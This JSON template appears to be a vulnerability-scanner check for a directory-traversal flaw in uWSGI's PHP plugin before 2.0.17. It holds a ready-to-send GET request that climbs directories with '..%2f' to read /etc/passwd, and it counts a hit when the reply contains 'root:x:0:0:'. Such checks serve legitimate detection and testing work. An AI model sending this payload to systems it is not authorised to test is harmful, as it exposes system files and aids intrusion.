{
    "Name": "uWSGI 目录穿越",
    "Description": "uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言,uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨越目录，读取或运行DOCUMENT_ROOT目录以外的文件",
    "Product": "uWSGI",
    "author": "chumeng",
    "Request":[
                {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded"},
        "Uri":"/..%2f..%2f..%2f..%2f..%2fetc/passwd",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "root:x:0:0:"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}